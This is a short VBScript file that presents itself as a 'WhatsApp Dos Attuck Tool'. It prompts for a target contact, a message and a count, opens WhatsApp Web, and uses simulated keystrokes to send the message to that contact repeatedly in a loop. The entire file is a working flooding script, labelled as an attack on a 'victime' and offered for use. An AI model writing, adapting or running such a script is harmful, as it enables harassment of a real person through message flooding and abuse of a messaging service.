strScriptHost = LCase(Nakshatra_Ranjan_Saha)
' InputBoxes
Contact = InputBox("Which Conctact Do You Want To Dos Attuck ?", "WhatsApp Dos Attuck Tool Made By Nakshatra Saha")
Message = InputBox("What Is The Message send to the victime ?","WhatsApp Dos Attuck Tool Made By Nakshatra Saha")
T = InputBox("How Many Times Needs It To Be Send the message you write ?","WhatsApp Dos Attuck Tool Made By Nakshatra Saha")
If MsgBox("You've Filled It In Correctely", 1024 + vbSystemModal, "WhatsApp Dos Attuck Tool Made By Nakshatra Saha") = vbOk Then

' Go To WhatsApp
Set WshShell = WScript.CreateObject("WScript.Shell")
Return = WshShell.Run("https://web.whatsapp.com/", 1)

' Loading Time

If MsgBox("Is WhatsApp Loaded? If Not Click No" & vbNewLine & vbNewLine & "Press No To Cancel", vbYesNo + vbQuestion + vbSystemModal, "WhatsApp DDos") = vbYes Then

' Go To The WhatsApp Search Bar
WScript.Sleep 50
WshShell.SendKeys "{TAB}"

' Go To The Contacts Chat
WScript.Sleep 50
WshShell.SendKeys Contact
WScript.Sleep 50
WshShell.SendKeys "{ENTER}"

' The Loop For The Messages
For i = 0 to T
WScript.Sleep 5
WshShell.SendKeys Message
WScript.Sleep 5
WshShell.SendKeys "{ENTER}"
Next

' End Of The Script
WScript.Sleep 3000
MsgBox "Dosing Of " + Contact + " Is Done", 1024 + vbSystemModal, "Dos Is Done"

' Canceled Script
Else
MsgBox "Process Has Been Canceled", vbSystemModal, "WhatsApp Dos Canceled"
End If
Else
End If